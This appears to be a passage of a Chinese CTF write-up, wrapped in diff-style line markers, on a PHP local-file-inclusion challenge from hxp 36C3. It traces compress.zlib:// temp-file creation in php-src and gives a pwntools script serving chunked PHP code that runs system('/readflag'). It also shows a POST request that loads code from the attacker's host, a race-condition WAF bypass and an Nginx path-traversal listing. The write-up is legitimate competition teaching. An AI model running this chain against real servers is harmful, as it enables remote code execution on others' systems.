-<a href=/2022/01/08/2022-01-08-TheEndOfLFI/>
-<div class=article-details>
-<h2 class=article-title>hxp CTF 2021 - The End Of LFI?</h2>
-</div>
-</a>
-</article>
-<article>
-<a href=/2021/12/27/2021-12-20-ANewNovelLFI/>
-<div class=article-details>
-<h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2>
-</div>
-</a>
-</article>
-<article>
-<a href=/2021/08/02/cybrics-checkin-2021/>
-<div class=article-details>
-<h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2>
-</div>
-</a>
-</article>
-<article>
-<a href=/2021/07/21/google-qual-2021/>
-<div class=article-details>
-<h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2>
-</div>
-</a>
-</article>
-</div>
-</div>
-</aside>
-<div class=disqus-container>
-<div id=disqus_thread></div>
-<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
-<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
-<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
-</div>
-<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
-<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
-<footer class=site-footer>
-<section class=copyright>
-&copy;
+</code></pre><p>开启了列目录并且我们可以遍历到上层文件夹。</p><h3 id=upload-arbitrary-data>Upload Arbitrary Data</h3><p>一开始我看到这个没有<code>&lt;?</code>的形式，我想到的是p牛博客里面有关死亡 exit 的内容，<a class=link href=https://www.leavesongs.com/PENETRATION/php-filter-magic.html target=_blank rel=noopener>谈一谈php://filter的妙用</a>，奈何原文用的是<code>file_put_content</code>，我们这里用的是<code>file_get_contents</code>，并且这里的判断也在使用了<code>file_get_contents</code>函数之后进行判断是否有<code>&lt;?</code>，所以这里的编码绕过就不太可能了。</p><p>而且这里最奇怪的就是之前用了一些看似无关紧要的代码，比如使用了<code>putenv()</code>函数等，给了我们一个 sandbox ，然而我们似乎无法利用表面的代码进行文件上传啥的操作。</p><p>balsn 队伍在公开的 wp 中写了比较详细的源码分析，这里我就配合其中的 wp 进行一下简单的分析。</p><p>首先直接给出结论，我们可以使用<code>compress.zip://</code>流进行上传任意文件，接着我们来看看相关原理。</p><p>在 <a class=link href=https://github.com/php/php-src target=_blank rel=noopener>php-src</a> 源代码中，我们可以找到该流的相关触发解析函数<code>php_stream_gzopen</code></p><p>ext/zlib/zlib_fopen_wrapper.c</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>php_stream</span> <span class=o>*</span><span class=nf>php_stream_gzopen</span><span class=p>(</span><span class=n>php_stream_wrapper</span> <span class=o>*</span><span class=n>wrapper</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>mode</span><span class=p>,</span> <span class=kt>int</span> <span class=n>options</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>							  <span class=n>zend_string</span> <span class=o>**</span><span class=n>opened_path</span><span class=p>,</span> <span class=n>php_stream_context</span> <span class=o>*</span><span class=n>context</span> <span class=n>STREAMS_DC</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=p>...</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>strncasecmp</span><span class=p>(</span><span class=s>&#34;compress.zlib://&#34;</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>path</span> <span class=o>+=</span> <span class=mi>16</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>strncasecmp</span><span class=p>(</span><span class=s>&#34;zlib:&#34;</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=mi>5</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>path</span> <span class=o>+=</span> <span class=mi>5</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=n>innerstream</span> <span class=o>=</span> <span class=n>php_stream_open_wrapper_ex</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>mode</span><span class=p>,</span> <span class=n>STREAM_MUST_SEEK</span> <span class=o>|</span> <span class=n>options</span> <span class=o>|</span> <span class=n>STREAM_WILL_CAST</span><span class=p>,</span> <span class=n>opened_path</span><span class=p>,</span> <span class=n>context</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>...</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>我们可以看到有个标志位<code>STREAM_WILL_CAST</code>，我们可以先看看这个标志位用来干嘛，在<code>main/php_streams.h</code>定义了该标志位:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* If you are going to end up casting the stream into a FILE* or
+</span></span></span><span class=line><span class=cl><span class=cm> * a socket, pass this flag and the streams/wrappers will not use
+</span></span></span><span class=line><span class=cl><span class=cm> * buffering mechanisms while reading the headers, so that HTTP
+</span></span></span><span class=line><span class=cl><span class=cm> * wrapped streams will work consistently.
+</span></span></span><span class=line><span class=cl><span class=cm> * If you omit this flag, streams will use buffering and should end
+</span></span></span><span class=line><span class=cl><span class=cm> * up working more optimally.
+</span></span></span><span class=line><span class=cl><span class=cm> * */</span>
+</span></span><span class=line><span class=cl><span class=cp>#define STREAM_WILL_CAST                0x00000020
+</span></span></span></code></pre></div><p>很明显，这是一个用来将 stream 转换成 FILE* 的标志位，在这里就与我们创建临时文件有关了。</p><p>接着我们跟进<code>php_stream_open_wrapper_ex</code>函数，该函数在<code>main/php_streams.h</code>中被 define 为<code>_php_stream_open_wrapper_ex</code>。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>PHPAPI</span> <span class=n>php_stream</span> <span class=o>*</span><span class=nf>_php_stream_open_wrapper_ex</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>mode</span><span class=p>,</span> <span class=kt>int</span> <span class=n>options</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=n>zend_string</span> <span class=o>**</span><span class=n>opened_path</span><span class=p>,</span> <span class=n>php_stream_context</span> <span class=o>*</span><span class=n>context</span> <span class=n>STREAMS_DC</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=c1>//...
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=n>stream</span> <span class=o>!=</span> <span class=nb>NULL</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>options</span> <span class=o>&amp;</span> <span class=n>STREAM_MUST_SEEK</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>php_stream</span> <span class=o>*</span><span class=n>newstream</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		<span class=k>switch</span><span class=p>(</span><span class=n>php_stream_make_seekable_rel</span><span class=p>(</span><span class=n>stream</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>newstream</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>					<span class=p>(</span><span class=n>options</span> <span class=o>&amp;</span> <span class=n>STREAM_WILL_CAST</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>						<span class=o>?</span> <span class=nl>PHP_STREAM_PREFER_STDIO</span> <span class=p>:</span> <span class=n>PHP_STREAM_NO_PREFERENCE</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>  <span class=c1>//...
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>return</span> <span class=n>stream</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cm>/* }}} */</span>
+</span></span></code></pre></div><p>该函数调用了<code>php_stream_make_seekable_rel</code>，并向其中传入了<code>STREAM_WILL_CAST</code>参数，我们跟进<code>php_stream_make_seekable_rel</code>函数，它在<code>main/php_streams.h</code>中被 define 为<code>_php_stream_make_seekable</code>，继续跟进</p><p>main/streams/cast.c</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* {{{ php_stream_make_seekable */</span>
+</span></span><span class=line><span class=cl><span class=n>PHPAPI</span> <span class=kt>int</span> <span class=nf>_php_stream_make_seekable</span><span class=p>(</span><span class=n>php_stream</span> <span class=o>*</span><span class=n>origstream</span><span class=p>,</span> <span class=n>php_stream</span> <span class=o>**</span><span class=n>newstream</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span> <span class=n>STREAMS_DC</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>newstream</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>PHP_STREAM_FAILED</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=o>*</span><span class=n>newstream</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(((</span><span class=n>flags</span> <span class=o>&amp;</span> <span class=n>PHP_STREAM_FORCE_CONVERSION</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=n>origstream</span><span class=o>-&gt;</span><span class=n>ops</span><span class=o>-&gt;</span><span class=n>seek</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=o>*</span><span class=n>newstream</span> <span class=o>=</span> <span class=n>origstream</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>PHP_STREAM_UNCHANGED</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=cm>/* Use a tmpfile and copy the old streams contents into it */</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>flags</span> <span class=o>&amp;</span> <span class=n>PHP_STREAM_PREFER_STDIO</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=o>*</span><span class=n>newstream</span> <span class=o>=</span> <span class=n>php_stream_fopen_tmpfile</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=o>*</span><span class=n>newstream</span> <span class=o>=</span> <span class=n>php_stream_temp_new</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=c1>//...
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cm>/* }}} */</span>
+</span></span></code></pre></div><p>我们可以看到如果<code>flags</code>与<code>PHP_STREAM_PREFER_STDIO</code>都被设置的话，而<code>PHP_STREAM_PREFER_STDIO</code>在 main/php_streams.h 中已经被 define</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define PHP_STREAM_PREFER_STDIO		1
+</span></span></span></code></pre></div><p>我们只需要关心 flags 的值就好了，我们只需要确定 flags 的值非零即可，根据前面的跟进我们易知 flags 的在这里非零，所以这里就调用了<code>php_stream_fopen_tmpfile</code>函数创建了临时文件。</p><p>于是我们可以做一个简单的验证，在本机上跑源代码，并用 pwntools 起一个服务用来发送一个大文件</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_chunk</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>l</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;</span><span class=si>{}</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1></span><span class=si>{}</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>))[</span><span class=mi>2</span><span class=p>:],</span> <span class=n>data</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>while</span><span class=p>(</span><span class=kc>True</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>l</span> <span class=o>=</span> <span class=n>listen</span><span class=p>(</span><span class=mi>9999</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>l</span><span class=o>.</span><span class=n>wait_for_connection</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>data1</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>1024</span> <span class=o>*</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;X&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>data2</span> <span class=o>=</span> <span class=s1>&#39;&lt;?php system(&#34;/readflag&#34;); exit(); /*&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>1024</span> <span class=o>*</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;b&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>data3</span> <span class=o>=</span> <span class=s1>&#39;c*/&#39;</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>1024</span> <span class=o>*</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;c&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>l</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\r\n\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>l</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;HTTP/1.1 200 OK</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Content-Type: exploit/revxakep</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Connection: close</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Transfer-Encoding: chunked</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1></span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>send_chunk</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>data1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;waiting...&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;sending php code...&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>send_chunk</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>data2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>send_chunk</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>data3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>l</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;0</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1></span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1></span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>l</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span></code></pre></div><p>这样我在本机上用 fswatch 很明显可以看到临时文件已经生成，并且文件内容就是我们发送的内容。</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107053126.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107053126.png loading=lazy></a></figure></p><h3 id=keep-temp-file>Keep Temp File</h3><p>临时文件终究还是会被 php 删除掉的，如果我们要进行包含的话，就需要利用一些方法让临时文件尽可能久的留存在服务器上，这样我们才有机会去包含它。</p><p>所以这里是我们需要竞争的第一个点，基本上我们有两种方法让它停留比较久的时间：</p><ul><li>使用大文件传输，这样在传输的时候就会有一定的时间让我们包含到文件了。</li><li>使用 FTP 速度控制，大文件传输根本上还是传输速度的问题，我们可以通过一些方式限制传输速率，比较简单的也可以利用<code>compress.zlib://ftp://</code>形式，控制 FTP 速度即可</li></ul><h3 id=bypass-waf>Bypass Waf</h3><p>接下来我们就要看如何来对关键地方进行绕过了。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]),</span> <span class=s1>&#39;&lt;?&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>include_once</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span></code></pre></div><p>这个地方问了很多师傅，包括一血的 TokyoWesterns 的队员以及参考了主要的公开 WP，基本都是利用两个函数之间极端的时间窗进行绕过。</p><p>什么意思呢？也就是说，在极其理想的情况下，我们通过自己的服务先发送一段垃圾数据，这时候通过<code>stripos</code>的判断就是没有 PHP 代码的文件数据，接着我们利用 HTTP 长链接的形式，只要这个链接不断开，在我们绕过第一个判断之后，我们就可以发送第二段含有 PHP 代码的数据了，这样就能使<code>include_once</code>包含我们的代码了。</p><p>因为我们无法知道什么时候能绕过第一个判断，所以这里的方法只能利用竞争的形式去包含临时文件，这里是第二个我们需要竞争的点。</p><h3 id=leak-dir-path>Leak Dir path</h3><p>最后，要做到文件包含，自然得先知道它的文件路径，而文件路径每次都是随机的，所以我们又不得不通过某些方式去获取路径。</p><p>虽然我们可以直接看到题目是直接给出了路径，但是乍一看代码我们貌似只能等到全部函数结束之后才能拿到路径，然而之前我们说到的需要保留的长链接不能让我们立即得到我们的 sandbox 路径。</p><p>所以我们需要通过传入过大的 name 参数，导致 PHP output buffer 溢出，在保持连接的情况下获取沙箱路径，参考代码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;file=compress.zlib://http://192.168.151.132:8080&amp;name=&#39;&#39;&#39;</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span> <span class=o>+</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>1024</span> <span class=o>*</span> <span class=mi>7</span> <span class=o>+</span> <span class=mi>882</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;POST / HTTP/1.1</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Host: localhost</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Connection: close</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Content-Length: </span><span class=si>{}</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Content-Type: application/x-www-form-urlencoded</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Cookie: PHPSESSID=asdasdasd</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1></span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1></span><span class=si>{}</span><span class=se>\r</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>),</span> <span class=n>data</span><span class=p>))</span>
+</span></span></code></pre></div><h3 id=get-flag>Get Flag</h3><p>所以整个流程我们可以总结为以下：</p><ol><li>利用 <code>compress.zlib://http://</code>or<code>compress.zlib://ftp://</code> 来上传任意文件，并保持 HTTP 长链接竞争保存我们的临时文件</li><li>利用超长的 name 溢出 output buffer 得到 sandbox 路径</li><li>利用 Nginx 配置错误，通过 <code>.well-known../files/sandbox/</code>来获取我们 tmp 文件的文件名</li><li>发送另一个请求包含我们的 tmp 文件，此时并没有 PHP 代码</li><li>绕过 WAF 判断后，发送 PHP 代码段，包含我们的 PHP 代码拿到 Flag</li></ol><p>整个题目的关键点主要是以下几点(来自 @wupco)：</p><ol><li>需要利用大文件或ftp速度限制让连接保持</li><li>传入name过大 overflow output buffer，在保持连接的情况下获取沙箱路径</li><li>tmp文件需要在两种文件直接疯狂切换，使得第一次<code>file_get_contents</code>获取的内容不带有<code>&lt;?</code>,<code>include</code>的时候是正常php代码，需要卡时间点，所以要多跑几次才行</li><li><code>.well-known../files/</code>是nginx配置漏洞，就不多说了，用来列生成的tmp文件</li></ol><p>由于第二个极短的时间窗，我们需要比较准确地调控延迟时间，之前没调控好时间以及文件大小，挂一晚上脚本都没有 hit 中一次，第二天经过 @rebirth 的深刻指点，修改了一下延迟时间以及服务器响应的文件的大小，成功率得到了很大的提高，基本每次都可以 getflag。</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107214803.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107214803.png loading=lazy></a></figure></p><p>脚本放在<a class=link href=https://gist.github.com/ZeddYu/42159da911e82dba923b375a9f64ad65 target=_blank rel=noopener>gist-exp.py</a>，其中 192.168.34.1 是本地题目地址，192.168.151.132 是 client 的地址。</p><h2 id=references>References</h2><p><a class=link href=https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/ target=_blank rel=noopener>20191228-hxp36c3ctf</a></p><p><a class=link href=https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0 target=_blank rel=noopener>https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0</a></p><p><a class=link href=https://ctftime.org/task/10211 target=_blank rel=noopener>https://ctftime.org/task/10211</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/CTF/>CTF</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section><div class="notice notice-tip"><div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br></div></footer></article><aside class=related-contents--wrapper><h2 class=section-title>Related contents</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/2022/02/21/2022-02-21-PracticalTimingTimeless/><div class=article-details><h2 class=article-title>Writeup for A More Secure Pastebin - Practical Timeless Timing in Browser</h2></div></a></article><article><a href=/2022/01/08/2022-01-08-TheEndOfLFI/><div class=article-details><h2 class=article-title>hxp CTF 2021 - The End Of LFI?</h2></div></a></article><article><a href=/2021/12/27/2021-12-20-ANewNovelLFI/><div class=article-details><h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2></div></a></article><article><a href=/2021/08/02/cybrics-checkin-2021/><div class=article-details><h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2></div></a></article><article><a href=/2021/07/21/google-qual-2021/><div class=article-details><h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//ZeddYu.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{DISQUS&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
 2018 -
-2022 Zeddy's Blog
-</section>
-<section class=powerby>
-Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
-Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
-</section>
-</footer>
-<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
-<div class=pswp__bg></div>
-<div class=pswp__scroll-wrap>
-<div class=pswp__container>
-<div class=pswp__item></div>
-<div class=pswp__item></div>
-<div class=pswp__item></div>
-</div>
-<div class="pswp__ui pswp__ui--hidden">
-<div class=pswp__top-bar>
-<div class=pswp__counter></div>
-<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
